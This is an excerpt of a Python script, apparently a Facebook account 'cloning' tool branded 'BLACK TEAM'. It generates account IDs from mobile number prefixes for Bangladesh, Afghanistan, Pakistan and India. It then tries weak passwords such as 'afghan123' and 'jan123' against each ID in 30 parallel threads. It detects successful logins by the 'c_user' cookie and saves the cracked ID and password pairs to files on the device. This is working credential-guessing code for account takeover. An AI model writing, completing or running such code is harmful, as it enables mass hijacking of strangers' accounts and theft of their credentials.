...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/AfghanHack001/a/SAB-RANDOM/main/approve.txt').text
        ua=open('.bbnew.txt','w')
...
\033[1;97m====================================================
\033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92m𝐁𝐋𝐀𝐂𝐊 𝐓𝐄𝐀𝐌
\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mAlmas Nafas M.M.M
\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+18154916689
\033[1;97m====================================================
\x1b[31;1m   \x1b[47;2m[ 𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋 𝐈𝐒 𝐅𝐑𝐄𝐄 𝐄𝐍𝐉𝐎𝐘 ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐁𝐋𝐀𝐂𝐊 𝐓𝐄𝐀𝐌 ]\x1b[00;1m\x1b[31;1m
\033[1;97m===================================================="""
clear()
...
def main():
    ...
    print(f"\033[1;97m[02] \033[1;92mJOIN MY TELEGRAM CHANNEL")
...
def passx():
    ...
    print("\033[1;97m[07] \033[1;92mAFGHAN & MIX PASS          \033[1;96m[OK CLONE]")
    print("\033[1;97m====================================================")
...
def pass1():
    ...
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[01] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
    print(f'\033[1;97m[02] \033[1;92mAFG SIM CODES  \033[1;91m: \033[1;96m9377, 9379, 9374, 9378')
    print(f'\033[1;97m[03] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print(f'\033[1;97m[04] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR AFG [9377 / 9376 / 9379 / 0306 /0305]\033[0;m")
    print('\033[1;97m====================================================') 
...
def pass7():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m7') 
        print('\033[1;97m====================================================') 
        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        print('\033[1;97m====================================================') 
        for love in user:
            uid = code+love
            pwx = ['afghan','afghan123','afghan12345','afg123','afgafg','100200','50006000','70008000','jan123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/SAB-OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/SAB-CP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m𝐒𝐀𝐁-𝐎𝐊\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/SAB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91m𝐒𝐀𝐁-𝐂𝐏\033[1;97m]\033[1;90m '+uid+' | '+ps+ '  ') 
                    open('/sdcard/SAB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[CLONING..] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
